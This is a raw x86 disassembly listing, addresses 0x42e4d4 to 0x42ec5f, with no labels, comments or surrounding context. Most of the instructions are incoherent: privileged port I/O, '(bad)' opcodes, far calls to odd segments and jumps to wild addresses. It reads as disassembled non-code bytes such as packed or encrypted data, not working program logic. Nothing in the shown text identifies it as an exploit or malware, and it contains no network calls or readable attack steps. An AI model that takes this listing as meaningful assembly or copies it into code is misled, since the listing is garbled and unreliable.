  42e4d4:	push   edx
  42e4d5:	pop    ss
  42e4d6:	push   esp
  42e4d7:	out    dx,al
  42e4d8:	out    dx,al
  42e4d9:	and    al,0x10
  42e4db:	xor    eax,0x66c46c02
  42e4e0:	or     BYTE PTR [edi+edi*1-0x3f],bl
  42e4e4:	xor    DWORD PTR [edx+0x28eda90f],esp
  42e4ea:	add    al,0xf8
  42e4ec:	rcr    DWORD PTR [ebx],0x1
  42e4ef:	in     al,dx
  42e4f0:	ss xchg ebp,eax
  42e4f2:	jns    0x42e55d
  42e4f4:	mov    edx,0x2c7543d8
  42e4f9:	icebp  
  42e4fa:	dec    esp
  42e4fb:	sahf   
  42e4fc:	scas   eax,DWORD PTR es:[edi]
  42e4fd:	(bad)  
  42e4fe:	stc    
  42e4ff:	inc    edi
  42e500:	mov    esp,DWORD PTR [ebx]
  42e502:	mov    ah,0x8f
  42e504:	scas   eax,DWORD PTR es:[edi]
  42e505:	mov    eax,0x6f9201a4
  42e50a:	aas    
  42e50b:	cdq    
  42e50c:	xor    BYTE PTR [edx+0xf],dl
  42e50f:	xchg   ecx,eax
  42e510:	icebp  
  42e511:	test   al,0x3
  42e513:	cld    
  42e514:	cmp    eax,0xf2be955
  42e519:	mov    edi,0xff52a978
  42e51e:	fdiv   DWORD PTR [esi-0x5dd1affe]
  42e524:	call   0x0:0x3ffa
  42e52b:	add    dh,cl
  42e52d:	ds fsubr st(2),st
  42e530:	xor    eax,0x56815a14
  42e535:	cwde   
  42e536:	(bad)  
  42e537:	test   eax,0x65347c5
  42e53c:	pop    edx
  42e53d:	sahf   
  42e53e:	cli    
  42e53f:	je     0x42e527
  42e541:	dec    eax
  42e542:	dec    edi
  42e543:	test   BYTE PTR [ebx-0x66],0xfa
  42e547:	aam    0xd6
  42e549:	pop    es
  42e54a:	inc    eax
  42e54b:	jmp    0x20b63cdb
  42e550:	push   cs
  42e551:	aaa    
  42e552:	hlt    
  42e553:	pop    ebp
  42e554:	adc    DWORD PTR [ecx+0x46cd9d4c],eax
  42e55a:	mov    ah,0x72
  42e55c:	stos   DWORD PTR es:[edi],eax
  42e55d:	mov    dl,0xfa
  42e55f:	xor    al,0x25
  42e561:	or     eax,0x3ebda248
  42e566:	mov    eax,0x4f578ede
  42e56b:	cmp    BYTE PTR [eax],dl
  42e56d:	psubb  mm3,QWORD PTR [esi+0x29144a73]
  42e574:	jno    0x42e511
  42e576:	je     0x42e559
  42e578:	sub    edx,DWORD PTR [esi]
  42e57a:	aam    0x86
  42e57c:	pop    ebx
  42e57d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e57e:	out    0xfe,eax
  42e580:	inc    ebp
  42e581:	pushf  
  42e582:	cli    
  42e583:	bound  edx,QWORD PTR [ebx-0x5e]
  42e586:	mov    BYTE PTR [ecx+esi*8],ah
  42e589:	pushf  
  42e58a:	je     0x42e5d1
  42e58c:	ror    DWORD PTR [esi],1
  42e58e:	clc    
  42e58f:	pop    esi
  42e590:	add    BYTE PTR [eax],al
  42e592:	add    BYTE PTR [eax],al
  42e594:	add    BYTE PTR [eax-0x2eba8b64],dh
  42e59a:	out    dx,al
  42e59b:	(bad)  
  42e59d:	mov    dh,0x2
  42e59f:	sti    
  42e5a0:	add    BYTE PTR [ecx],ch
  42e5a2:	imul   esi,ebp,0x15
  42e5a5:	mov    ebx,?
  42e5a7:	aas    
  42e5a8:	add    bl,bh
  42e5aa:	pop    ebp
  42e5ab:	adc    eax,eax
  42e5ad:	sub    al,0x43
  42e5af:	add    BYTE PTR [ecx],bh
  42e5b1:	xor    edi,eax
  42e5b3:	outs   dx,BYTE PTR ds:[esi]
  42e5b4:	and    ah,ah
  42e5b6:	jb     0x42e626
  42e5b8:	inc    eax
  42e5b9:	dec    esp
  42e5ba:	pop    esi
  42e5bb:	jae    0x42e591
  42e5bd:	or     DWORD PTR [eax],0xffffffa8
  42e5c0:	adc    bl,ah
  42e5c2:	add    dh,BYTE PTR [ebx]
  42e5c4:	ret    
  42e5c5:	test   al,0x98
  42e5c7:	cmc    
  42e5c8:	jne    0x42e54e
  42e5ca:	pop    esi
  42e5cb:	retf   0x89ff
  42e5ce:	(bad)  
  42e5cf:	cmc    
  42e5d0:	adc    eax,0x3a8fd4
  42e5d5:	xchg   DWORD PTR [ecx-0x18],ecx
  42e5d8:	pop    edi
  42e5d9:	inc    edx
  42e5da:	xlat   BYTE PTR ds:[ebx]
  42e5db:	enter  0xd8c2,0x2
  42e5df:	dec    esi
  42e5e0:	mov    ebp,DWORD PTR ds:0xcc000966
  42e5e6:	add    ch,dh
  42e5e8:	inc    esp
  42e5e9:	push   0xda740106
  42e5ee:	fsub   st,st(7)
  42e5f0:	mov    esp,0x8bf56304
  42e5f5:	sbb    al,BYTE PTR [edx+edi*4+0x4]
  42e5f9:	add    BYTE PTR [eax],al
  42e5fb:	add    BYTE PTR [eax],al
  42e5fd:	add    ah,cl
  42e5ff:	xchg   DWORD PTR [eax+0x8],eax
  42e602:	fisttp DWORD PTR [ebx]
  42e604:	in     al,dx
  42e605:	mov    WORD PTR [esi+edi*8-0x7c],ds
  42e609:	shr    BYTE PTR [eax+0x7c088304],0x63
  42e610:	dec    edi
  42e611:	or     BYTE PTR [edi],bl
  42e613:	in     al,dx
  42e614:	pop    es
  42e615:	add    BYTE PTR [ebx],dl
  42e617:	cld    
  42e618:	or     edi,edi
  42e61a:	mov    DWORD PTR [esi-0x568abff7],esi
  42e620:	mov    ecx,ecx
  42e622:	pop    esp
  42e623:	sbb    dl,BYTE PTR [ebx-0x76889506]
  42e629:	jmp    0x42e5ef
  42e62b:	ins    DWORD PTR es:[edi],dx
  42e62c:	shl    ecx,1
  42e62e:	ret    
  42e62f:	jne    0x42e669
  42e631:	data16 jbe 0x42e6a1
  42e634:	cmp    BYTE PTR [edx-0x21],dl
  42e637:	fdiv   QWORD PTR ds:0xf61b68fb
  42e63d:	aas    
  42e63e:	jne    0x42e5f0
  42e640:	enter  0x7e73,0xc6
  42e644:	sti    
  42e645:	add    BYTE PTR [ebx+ebp*1+0x18],dh
  42e649:	add    al,0x67
  42e64b:	jmp    0x42e5f7
  42e64d:	xor    eax,edx
  42e64f:	or     DWORD PTR [esi+0x26abb512],0xffffffc0
  42e656:	ins    DWORD PTR es:[edi],dx
  42e657:	jmp    0x42e65c
  42e659:	call   0xfae09f49
  42e65e:	out    dx,al
  42e65f:	mov    bl,0xd9
  42e661:	stc    
  42e662:	add    BYTE PTR [eax],al
  42e664:	add    BYTE PTR [eax],al
  42e666:	add    BYTE PTR [eax-0x61],ch
  42e669:	aam    0xbf
  42e66b:	fisub  WORD PTR [edx-0x589704cf]
  42e671:	popf   
  42e672:	adc    al,0x31
  42e674:	mov    eax,0x73fe003e
  42e679:	mov    DWORD PTR [edx],eax
  42e67b:	mov    ?,WORD PTR [ebp+0x742a0d17]
  42e681:	or     BYTE PTR cs:[edi+0x535b396b],al
  42e688:	(bad)  
  42e689:	les    eax,FWORD PTR [edi]
  42e68b:	jne    0x42e69b
  42e68d:	push   eax
  42e68e:	cld    
  42e68f:	inc    esp
  42e690:	in     eax,dx
  42e691:	xor    eax,0x35f54352
  42e696:	dec    edi
  42e697:	sub    ah,BYTE PTR [edi+ebp*1]
  42e69a:	or     al,0xfc
  42e69c:	add    ch,BYTE PTR [edi+ecx*1-0x5d4e0206]
  42e6a3:	sub    cl,BYTE PTR [edx]
  42e6a5:	mov    dh,0xa2
  42e6a7:	mov    esi,edx
  42e6a9:	cmc    
  42e6aa:	inc    ebx
  42e6ab:	jne    0x42e688
  42e6ad:	mov    ebx,0xffb1e80f
  42e6b2:	sbb    BYTE PTR [ecx+0xe],bl
  42e6b5:	and    edi,DWORD PTR [ecx]
  42e6b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e6b8:	sub    dh,ah
  42e6ba:	sub    eax,0x2dbb2f4a
  42e6bf:	jnp    0x42e656
  42e6c1:	xchg   ebx,eax
  42e6c2:	lahf   
  42e6c3:	aas    
  42e6c4:	out    dx,eax
  42e6c5:	pusha  
  42e6c6:	stc    
  42e6c7:	jb     0x42e6cb
  42e6c9:	fs ret 
  42e6cb:	add    BYTE PTR [eax],al
  42e6cd:	add    BYTE PTR [eax],al
  42e6cf:	add    bl,dh
  42e6d1:	ds add eax,0xf0896d17
  42e6d7:	xor    ebx,DWORD PTR [esi]
  42e6d9:	xor    esp,ecx
  42e6db:	scas   al,BYTE PTR es:[edi]
  42e6dc:	fimul  WORD PTR [eax+0x42fc0b9b]
  42e6e2:	icebp  
  42e6e3:	push   ebx
  42e6e4:	jne    0x42e68f
  42e6e6:	test   BYTE PTR [edi],dh
  42e6e8:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e6ea:	gs mov al,0x82
  42e6ed:	mov    esp,0x7f75a223
  42e6f2:	test   al,0x18
  42e6f4:	pop    esi
  42e6f5:	xor    DWORD PTR [ebx],edx
  42e6f7:	cmp    eax,ebp
  42e6f9:	sbb    ah,cl
  42e6fb:	mov    bh,BYTE PTR [ecx]
  42e6fd:	mov    ds,WORD PTR [ebp+0x9]
  42e700:	cld    
  42e701:	ds cdq 
  42e703:	xchg   DWORD PTR [edx],eax
  42e705:	push   cs
  42e706:	pop    es
  42e707:	lea    eax,[edi-0x66]
  42e70a:	loope  0x42e765
  42e70c:	dec    edi
  42e70d:	(bad)  
  42e70e:	pop    ebp
  42e70f:	retf   0x3eb4
  42e712:	add    BYTE PTR [ecx*4+0x7503f0d3],0x81
  42e71a:	push   DWORD PTR [eax+0x77]
  42e71d:	and    al,0x43
  42e71f:	pop    esp
  42e720:	xor    bl,BYTE PTR [edx+0x1c36d34f]
  42e726:	sbb    dh,BYTE PTR [edi-0x30566b8]
  42e72c:	into   
  42e72d:	repnz aas 
  42e72f:	jmp    0xfbb63b27
  42e734:	add    BYTE PTR [eax],al
  42e736:	add    BYTE PTR [eax],al
  42e738:	add    BYTE PTR [eax-0x7d580fe],dl
  42e73e:	inc    esp
  42e73f:	sti    
  42e740:	mov    esp,0x2e6631e6
  42e745:	adc    al,0xef
  42e747:	imul   edi,ebx,0xffffffb6
  42e74a:	add    al,BYTE PTR [ebp-0x3e01a2d7]
  42e750:	lods   al,BYTE PTR ds:[esi]
  42e751:	aad    0x2
  42e753:	lea    esp,[esi+ecx*1-0x18304bc]
  42e75a:	sbb    eax,0x9748971a
  42e75f:	cli    
  42e760:	fsubr  QWORD PTR [esi-0x916c00e]
  42e766:	push   ss
  42e767:	sti    
  42e768:	jmp    0x2504e5d8
  42e76d:	xlat   BYTE PTR ds:[ebx]
  42e76e:	xchg   ebx,eax
  42e76f:	jge    0x42e71f
  42e771:	out    0x98,al
  42e773:	dec    esp
  42e774:	aad    0x83
  42e776:	test   DWORD PTR [edx+0x27],ebx
  42e779:	mov    al,ds:0xafbf447c
  42e77e:	push   esp
  42e77f:	push   ecx
  42e780:	push   ds
  42e781:	add    BYTE PTR [esi+0x6f9b886],cl
  42e787:	xor    al,0xc7
  42e789:	cmp    DWORD PTR [edx],eax
  42e78b:	push   ebx
  42e78c:	aaa    
  42e78d:	or     eax,ecx
  42e78f:	sbb    edx,DWORD PTR [edi-0x2f371b2b]
  42e795:	inc    edi
  42e796:	rcr    ecx,cl
  42e798:	add    BYTE PTR [edi-0x2],cl
  42e79b:	je     0x42e7a3
  42e79d:	add    BYTE PTR [eax],al
  42e79f:	add    BYTE PTR [eax],al
  42e7a1:	add    BYTE PTR ds:0x5fde3b38,ah
  42e7a7:	(bad)  
  42e7a8:	jp     0x42e76b
  42e7aa:	nop
  42e7ab:	jle    0x42e7a4
  42e7ad:	sbb    BYTE PTR [esi+0x4f5e5565],bl
  42e7b3:	int3   
  42e7b4:	sub    ah,0x2d
  42e7b7:	into   
  42e7b8:	dec    ebp
  42e7b9:	mov    eax,DWORD PTR [ecx+0x3]
  42e7bc:	sub    ebx,ebx
  42e7be:	pop    edi
  42e7bf:	enter  0xf331,0x22
  42e7c3:	xchg   edi,eax
  42e7c4:	add    DWORD PTR [ebp+0x54],0x450cba7e
  42e7cb:	xlat   BYTE PTR ds:[ebx]
  42e7cc:	repz je 0x42e7b8
  42e7cf:	xchg   DWORD PTR [edx-0x4],edx
  42e7d2:	les    edx,FWORD PTR [edi-0x70a37cc1]
  42e7d8:	xor    esi,ecx
  42e7da:	push   cs
  42e7db:	push   ecx
  42e7dc:	add    esi,0x5719bf07
  42e7e2:	push   es
  42e7e3:	aas    
  42e7e4:	push   0xfffecc00
  42e7e9:	dec    edi
  42e7ea:	out    dx,eax
  42e7eb:	in     al,0xf6
  42e7ed:	inc    DWORD PTR [ecx]
  42e7ef:	jmp    0x42e7fa
  42e7f1:	inc    eax
  42e7f2:	or     al,0x88
  42e7f4:	repnz cmp eax,edi
  42e7f7:	stc    
  42e7f8:	inc    esi
  42e7f9:	mov    DWORD PTR [ecx-0x5d0cce9e],ebx
  42e7ff:	scas   al,BYTE PTR es:[edi]
  42e800:	xor    DWORD PTR [ebp-0x1c],0x8c07f
  42e807:	add    BYTE PTR [eax],al
  42e809:	add    BYTE PTR [eax],al
  42e80b:	push   edi
  42e80c:	aam    0xf7
  42e80e:	push   0x3d354b
  42e813:	xor    DWORD PTR [ebx+0x70],0xfffffffc
  42e817:	in     al,0xc
  42e819:	(bad)  
  42e81a:	push   DWORD PTR [ebp-0x57]
  42e81d:	xchg   DWORD PTR [edi+0x398b8e21],edi
  42e823:	jbe    0x42e7a6
  42e825:	call   0xfe04:0x42109944
  42e82c:	in     eax,0x9f
  42e82e:	jle    0x42e7e3
  42e830:	mov    eax,0xb77144d5
  42e835:	mov    ah,0x86
  42e837:	xor    BYTE PTR [ebp-0x508ebb25],ah
  42e83d:	push   es
  42e83e:	mov    al,0x74
  42e840:	inc    esp
  42e841:	or     ch,BYTE PTR [esi]
  42e843:	xor    eax,0xa8870735
  42e848:	xchg   ebx,eax
  42e849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e84a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e84b:	push   ebx
  42e84c:	fstp   DWORD PTR [edx+0x3c81352d]
  42e852:	push   edi
  42e853:	sub    al,0xde
  42e855:	or     eax,DWORD PTR [eax]
  42e857:	adc    al,0x68
  42e859:	mov    esp,0xc41e753e
  42e85e:	jae    0x42e8d9
  42e860:	call   0x5d796c6d
  42e865:	(bad)  
  42e866:	(bad)  
  42e867:	pop    esp
  42e868:	pop    edx
  42e869:	(bad)  
  42e86a:	out    0x82,al
  42e86c:	cmp    al,BYTE PTR [edx+ebx*8+0x0]
  42e870:	add    BYTE PTR [eax],al
  42e872:	add    BYTE PTR [eax],al
  42e874:	mov    dh,0x9b
  42e876:	rol    DWORD PTR [ecx+edi*8],0x5c
  42e87a:	cmp    eax,0x44e25100
  42e87f:	add    BYTE PTR [esi],dl
  42e881:	sbb    al,0xbe
  42e883:	ds jne 0x42e900
  42e886:	fidiv  DWORD PTR cs:[esi]
  42e889:	fwait
  42e88a:	pop    ebp
  42e88b:	(bad)  
  42e88c:	mov    dh,0xdc
  42e88e:	add    esp,DWORD PTR [ecx+0x3eaefd]
  42e894:	push   ss
  42e895:	jl     0x42e854
  42e897:	ds jne 0x42e89c
  42e89a:	dec    eax
  42e89b:	push   ebx
  42e89c:	popa   
  42e89d:	inc    edx
  42e89e:	jmp    0x2608cb05
  42e8a3:	add    al,0xd4
  42e8a5:	(bad)  
  42e8a7:	inc    ebx
  42e8a8:	jne    0x42e90f
  42e8aa:	test   al,0xc2
  42e8ac:	pop    ebx
  42e8ad:	add    cl,BYTE PTR [eax+0x67]
  42e8b0:	imul   eax,DWORD PTR [edx-0x17],0x25c5ba62
  42e8b7:	add    al,0xd4
  42e8b9:	pop    edx
  42e8ba:	sti    
  42e8bb:	inc    ebx
  42e8bc:	jne    0x42e923
  42e8be:	dec    eax
  42e8bf:	ret    0x2b3
  42e8c2:	mov    BYTE PTR [ebx-0x7f],dh
  42e8c5:	inc    edx
  42e8c6:	jmp    0xa6083b2d
  42e8cb:	add    edx,DWORD PTR [esi+esi*2]
  42e8ce:	rol    DWORD PTR [ebx+0x75],cl
  42e8d1:	gs call 0x8845749e
  42e8d7:	jnp    0x42e8d9
  42e8d9:	add    BYTE PTR [eax],al
  42e8db:	add    BYTE PTR [eax],al
  42e8dd:	imul   eax,DWORD PTR [edx-0x17],0xa5c66a62
  42e8e4:	add    edx,esp
  42e8e6:	sar    ebx,0x43
  42e8e9:	jne    0x42e950
  42e8eb:	enter  0x63c7,0x2
  42e8ef:	dec    eax
  42e8f0:	add    DWORD PTR [ecx+0x6262e942],0xffffffc6
  42e8f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e8f8:	add    edx,esp
  42e8fa:	ins    DWORD PTR es:[edi],dx
  42e8fb:	rol    DWORD PTR [ebx+0x75],cl
  42e8fe:	gs sub al,cl
  42e901:	cmp    eax,DWORD PTR [edx]
  42e903:	mov    BYTE PTR [eax+0x60e94289],dl
  42e909:	cmp    al,dh
  42e90b:	and    eax,0xdad61404
  42e910:	inc    ebx
  42e911:	jne    0x42e978
  42e913:	dec    eax
  42e914:	enter  0x293,0x0
  42e918:	mov    BYTE PTR [ecx+0x55e93ff2],ch
  42e91e:	and    esp,eax
  42e920:	sub    dh,BYTE PTR [ecx+0x63]
  42e923:	repz hlt 
  42e925:	add    bl,BYTE PTR ss:[edi-0x304297]
  42e92c:	inc    edi
  42e92d:	cdq    
  42e92e:	repnz aas 
  42e930:	jmp    0x2b066a4a
  42e935:	jns    0x42e99a
  42e937:	out    dx,eax
  42e938:	fdiv   QWORD PTR [esi]
  42e93a:	add    bl,BYTE PTR [edi-0x3052b7]
  42e940:	xchg   DWORD PTR [eax],eax
  42e942:	add    BYTE PTR [eax],al
  42e944:	add    BYTE PTR [eax],al
  42e946:	popf   
  42e947:	cmc    
  42e948:	aas    
  42e949:	jmp    0xab064923
  42e94e:	jbe    0x42e9b1
  42e950:	addr16 cmc 
  42e952:	mov    dh,0x2
  42e954:	lahf   
  42e955:	sub    DWORD PTR ds:0x8187ffd1,ebp
  42e95b:	idiv   BYTE PTR [edi]
  42e95d:	jmp    0xab06a937
  42e962:	jbe    0x42e9c5
  42e964:	cmp    edi,esp
  42e966:	mov    dh,0x2
  42e968:	lahf   
  42e969:	or     DWORD PTR ds:0x2547ffd1,edi
  42e96f:	idiv   DWORD PTR [edi]
  42e971:	jmp    0xab06890b
  42e976:	jbe    0x42e9d9
  42e978:	arpl   bp,dx
  42e97a:	mov    dh,0x2
  42e97c:	lahf   
  42e97d:	jmp    0x4842bab5
  42e982:	dec    ecx
  42e983:	idiv   BYTE PTR [edi]
  42e985:	jmp    0x2b07e91f
  42e98a:	jns    0x42e9ed
  42e98c:	das    
  42e98d:	cld    
  42e98e:	add    bl,BYTE PTR ss:[edi-0x2f45f7]
  42e995:	(bad)  
  42e996:	in     eax,dx
  42e997:	inc    ebx
  42e998:	adc    eax,0x2b22dc40
  42e99d:	lds    ebx,FWORD PTR [edi-0x579f5efa]
  42e9a3:	inc    ebx
  42e9a4:	add    BYTE PTR [ebx+0x39c78c],ah
  42e9aa:	add    BYTE PTR [eax],al
  42e9ac:	add    BYTE PTR [eax],al
  42e9ae:	add    BYTE PTR ds:0x9c4013d7,bh
  42e9b4:	and    cl,BYTE PTR [ebx-0x3b]
  42e9b7:	dec    edi
  42e9b8:	push   es
  42e9b9:	mov    eax,ds:0x43b858
  42e9be:	mov    ds:0x39c77c,eax
  42e9c3:	cmp    eax,0x8c4013cf
  42e9c8:	and    ch,BYTE PTR [ebx-0x3b]
  42e9cb:	iret   
  42e9cc:	add    esp,DWORD PTR [ecx+0x43684c]
  42e9d2:	mov    ds:0x39c8dc,eax
  42e9d7:	in     eax,dx
  42e9d8:	stos   BYTE PTR es:[edi],al
  42e9d9:	adc    eax,DWORD PTR [eax+0x4c]
  42e9dc:	and    cl,BYTE PTR [ebx-0x5efce03b]
  42e9e2:	sub    BYTE PTR [ecx],ch
  42e9e4:	inc    ebx
  42e9e5:	add    BYTE PTR [ebx+0x39c7ec],ah
  42e9eb:	lods   eax,DWORD PTR ds:[esi]
  42e9ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e9ed:	push   cs
  42e9ee:	inc    eax
  42e9ef:	sbb    al,0x22
  42e9f1:	stos   DWORD PTR es:[edi],eax
  42e9f2:	(bad)
  42e9f5:	mov    eax,ds:0x432838
  42e9fa:	mov    ds:0x39c84c,eax
  42e9ff:	mov    ebp,0x1c400e8b
  42ea04:	and    cl,bl
  42ea06:	(bad)
  42ea09:	mov    eax,ds:0x42f908
  42ea0e:	mov    ds:0x39c0bc,eax
  42ea13:	add    BYTE PTR [eax],al
  42ea15:	add    BYTE PTR [eax],al
  42ea17:	add    BYTE PTR [ebp+0x7a],dh
  42ea1a:	rcl    DWORD PTR [ebx],cl
  42ea1c:	xor    eax,0xb0ef6199
  42ea21:	fild   DWORD PTR [ebx]
  42ea23:	mov    eax,ds:0x3eb665
  42ea28:	push   ss
  42ea29:	cdq    
  42ea2a:	sar    BYTE PTR [esi],0x75
  42ea2d:	jp     0x42ea12
  42ea2f:	adc    esi,DWORD PTR ds:0xbb0f6199
  42ea35:	fild   DWORD PTR [ebx]
  42ea37:	mov    eax,ds:0x3e8d05
  42ea3c:	(bad)  
  42ea3d:	mov    eax,0x3a753ec0
  42ea42:	xchg   esp,eax
  42ea43:	adc    esi,DWORD PTR ds:0xb32f6199
  42ea49:	fild   DWORD PTR [ebx]
  42ea4b:	mov    eax,ds:0x3eb4a1
  42ea50:	(bad)  
  42ea51:	pop    eax
  42ea52:	sar    BYTE PTR [esi],0x75
  42ea55:	jp     0x42ea5a
  42ea57:	adc    al,0xb5
  42ea59:	fwait
  42ea5a:	popa   
  42ea5b:	dec    edi
  42ea5c:	cmp    ebx,DWORD PTR [ecx-0x2]
  42ea5f:	mov    al,ds:0x3ea94d
  42ea64:	push   ss
  42ea65:	mov    esp,0x7a753ec0
  42ea6a:	lahf   
  42ea6b:	adc    esi,DWORD PTR [ebp+0x336f619b]
  42ea71:	pop    ecx
  42ea72:	(bad)  
  42ea73:	mov    al,ds:0x3e8931
  42ea78:	(bad)  
  42ea79:	sbb    edi,DWORD PTR [esi+0x3e]
  42ea7f:	add    BYTE PTR [eax],al
  42ea81:	jne    0x42eabd
  42ea83:	mov    al,ds:0x619bb50e
  42ea88:	(bad)  
  42ea89:	cmp    ebx,DWORD PTR [ecx-0x2]
  42ea8c:	mov    al,ds:0x3ea929
  42ea91:	(bad)  
  42ea92:	cmp    edi,DWORD PTR [esi-0x77fd8ac2]
  42ea98:	xchg   BYTE PTR [bp+si-0x17],al
  42ea9c:	data16 sbb al,ch
  42ea9f:	and    eax,0xf4b71404
  42eaa4:	inc    ebx
  42eaa5:	jne    0x42eb08
  42eaa7:	test   al,0xc1
  42eaa9:	xchg   ebx,eax
  42eaaa:	add    cl,BYTE PTR [eax-0x16bd99ad]
  42eab0:	data16 mov dl,0xc4
  42eab3:	and    eax,0xfc771404
  42eab8:	inc    ebx
  42eab9:	jne    0x42eb1c
  42eabb:	mov    cl,al
  42eabd:	imul   eax,DWORD PTR [edx],0x48
  42eac0:	outs   dx,DWORD PTR ds:[esi]
  42eac1:	jb     0x42eb05
  42eac3:	jmp    0x695d47f5
  42eac8:	(bad)  
  42eac9:	push   ebx
  42eaca:	add    al,BYTE PTR [esi-0x6d]
  42eacd:	mov    ah,0x41
  42eacf:	jmp    0x69d2627f
  42ead4:	call   0x5aa9:0x8ebb31bb
  42eadb:	test   BYTE PTR [ebx+0x75],0x1a
  42eadf:	pop    ecx
  42eae0:	xchg   DWORD PTR [edx+0x9ab202],esp
  42eae6:	add    BYTE PTR [eax],al
  42eae8:	add    BYTE PTR [eax],al
  42eaea:	inc    esp
  42eaeb:	sbb    ch,ch
  42eaed:	mov    BYTE PTR [edx+0x4a669202],dl
  42eaf3:	les    esp,FWORD PTR [ebp-0x3f4bc1fd]
  42eaf9:	repz jmp 0x1275d440
  42eaff:	repnz and DWORD PTR [esi+0x75],eax
  42eb03:	lea    edi,[edx]
  42eb05:	sub    edi,DWORD PTR [ebp+0x7f]
  42eb08:	test   al,0x3
  42eb0a:	(bad)  
  42eb0b:	popa   
  42eb0c:	enter  0x53c2,0x2
  42eb10:	cli    
  42eb11:	mov    al,0x92
  42eb13:	loop   0x42eb14
  42eb15:	arpl   WORD PTR [esi+0x264a5302],si
  42eb1b:	sar    BYTE PTR [esi],0xe9
  42eb1e:	or     eax,0x9ee465b3
  42eb23:	add    al,bl
  42eb25:	sub    bh,BYTE PTR [ecx+0x6d]
  42eb28:	aas    
  42eb29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb2a:	xor    BYTE PTR [edx],al
  42eb2c:	call   0xfacad8a9
  42eb31:	jae    0x42eb3c
  42eb33:	adc    esi,0x3487a23d
  42eb39:	and    DWORD PTR [ebx+ecx*8-0x784b8e01],esi
  42eb40:	xor    al,0xe1
  42eb42:	mov    ch,0xcb
  42eb44:	call   DWORD PTR [ebp+0x2ac2e4b2]
  42eb4a:	jno    0x42ead5
  42eb4c:	xor    al,0xe1
  42eb4e:	add    BYTE PTR [eax],al
  42eb50:	add    BYTE PTR [eax],al
  42eb52:	add    BYTE PTR [ebp-0x45820035],dh
  42eb58:	add    al,0xc3
  42eb5a:	sub    bh,BYTE PTR [ecx-0x66]
  42eb5d:	sbb    eax,0x5987ddba
  42eb62:	jae    0x42eb9c
  42eb64:	xor    eax,0x103e64bf
  42eb69:	adc    al,0x6a
  42eb6b:	jge    0x42eb53
  42eb6d:	add    ebp,ecx
  42eb6f:	push   0xfffffffd
  42eb71:	cli    
  42eb72:	mov    ebp,0x3e510032
  42eb77:	pop    edx
  42eb78:	adc    BYTE PTR [edi],cl
  42eb7a:	test   eax,0xfa12a376
  42eb7f:	add    BYTE PTR [ebp-0x198d2d40],al
  42eb85:	add    esp,DWORD PTR [esi+edi*1-0x7]
  42eb89:	xchg   esp,eax
  42eb8a:	sub    eax,DWORD PTR [esp+esi*4]
  42eb8d:	push   ss
  42eb8e:	sub    edx,esi
  42eb90:	das    
  42eb91:	push   cs
  42eb92:	add    BYTE PTR [ebx-0x5b],bh
  42eb95:	mov    esp,0x850010c2
  42eb9a:	leave  
  42eb9b:	sbb    BYTE PTR [ebx-0x73cf8387],0xfa
  42eba2:	jae    0x42eb8d
  42eba4:	push   0x6e
  42eba6:	and    al,0xd0
  42eba8:	shl    dh,1
  42ebaa:	adc    eax,0x3a90f4
  42ebaf:	mov    bh,0x92
  42ebb1:	sub    edx,edx
  42ebb3:	inc    edi
  42ebb4:	shl    BYTE PTR [ecx],0x44
  42ebb7:	add    BYTE PTR [eax],al
  42ebb9:	add    BYTE PTR [eax],al
  42ebbb:	add    BYTE PTR [eax+0x2],dh
  42ebbe:	test   ecx,ecx
  42ebc0:	fistp  DWORD PTR [edi*4-0x45711b09]
  42ebc7:	lea    esi,[eax-0x6c]
  42ebca:	cmc    
  42ebcb:	and    ebx,esi
  42ebcd:	(bad)  
  42ebd0:	popa   
  42ebd1:	jge    0x42ebb9
  42ebd3:	sbb    DWORD PTR [eax],0xffffffab
  42ebd6:	push   eax
  42ebd7:	mov    esi,0x394df4
  42ebdc:	(bad)  
  42ebde:	add    edi,eax
  42ebe0:	out    0x46,al
  42ebe2:	add    BYTE PTR [ecx*4+0x71feffff],bl
  42ebe9:	and    edx,DWORD PTR [eax]
  42ebeb:	inc    eax
  42ebec:	pop    esp
  42ebed:	or     al,0xbb
  42ebef:	(bad)  
  42ebf1:	add    eax,DWORD PTR [ecx]
  42ebf3:	add    BYTE PTR [ebp+ebx*8-0x7],cl
  42ebf7:	pop    eax
  42ebf8:	jne    0x42ebfd
  42ebfa:	or     bl,bl
  42ebfc:	pop    ds
  42ebfd:	inc    DWORD PTR [esi]
  42ebff:	test   DWORD PTR [ecx-0x13000001],ecx
  42ec05:	xchg   esp,eax
  42ec06:	(bad)  
  42ec07:	inc    ebx
  42ec08:	sbb    al,0xb6
  42ec0a:	int3   
  42ec0b:	cmp    al,0x1d
  42ec0d:	cld    
  42ec0e:	dec    ecx
  42ec0f:	mov    eax,ds:0x3ebcf575
  42ec14:	jne    0x42ec2e
  42ec16:	xchg   edi,eax
  42ec17:	add    al,0x88
  42ec19:	mov    eax,0x582fff5d
  42ec1e:	(bad)  
  42ec1f:	add    BYTE PTR ss:[eax],al
  42ec22:	add    BYTE PTR [eax],al
  42ec24:	add    BYTE PTR [edi],dh
  42ec26:	push   cs
  42ec27:	push   es
  42ec28:	ret    0x8970
  42ec2b:	mov    ebx,0xa59a753e
  42ec30:	jnp    0x42ec28
  42ec32:	mov    al,ds:0xf0797404
  42ec37:	les    esi,FWORD PTR [esi+eiz*2+0x21]
  42ec3b:	or     eax,esi
  42ec3d:	scas   eax,DWORD PTR es:[edi]
  42ec3e:	xlat   BYTE PTR ds:[ebx]
  42ec3f:	add    esp,edi
  42ec41:	pop    esi
  42ec42:	sbb    BYTE PTR [ecx+eax*1-0x9ac4b8],bl
  42ec49:	lahf   
  42ec4a:	xlat   BYTE PTR ds:[ebx]
  42ec4b:	add    esi,DWORD PTR [edi]
  42ec4d:	mov    bh,0xed
  42ec4f:	or     al,0xc2
  42ec51:	jo     0x42ecbc
  42ec53:	mov    ch,0x3e
  42ec55:	jne    0x42ebf4
  42ec57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ec58:	push   ebx
  42ec59:	div    BYTE PTR [eax+0x4]
  42ec5c:	jne    0x42eca0
  42ec5e:	pop    ebx
  42ec5f:	add    al,dh
